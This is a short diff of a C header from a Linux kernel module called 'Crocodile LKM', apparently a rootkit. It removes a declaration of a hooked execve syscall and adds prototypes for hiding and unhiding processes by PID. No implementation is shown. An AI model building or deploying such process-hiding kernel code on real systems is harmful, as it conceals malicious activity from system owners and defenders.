@@ -16,12 +16,16 @@
  * along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 
-#ifndef _CROCODILE_LKM_SYSTBL_HOOK_FUNCS_H_
-#define _CROCODILE_LKM_SYSTBL_HOOK_FUNCS_H_
+#ifndef _CROCODILE_LKM_CTRL_PID_UTILS_H_
+#define _CROCODILE_LKM_CTRL_PID_UTILS_H_
 
-#include "types.h"
+#include <linux/types.h>
 
-asmlinkage long hack_execve(const struct pt_regs* p_regs);
+int is_process_hidden(pid_t pid);
 
-#endif /* _CROCODILE_LKM_SYSTBL_HOOK_FUNCS_H_ */
+long process_hide(pid_t pid);
+
+long process_show(pid_t pid);
+
+#endif /* _CROCODILE_LKM_CTRL_PID_UTILS_H_ */
 
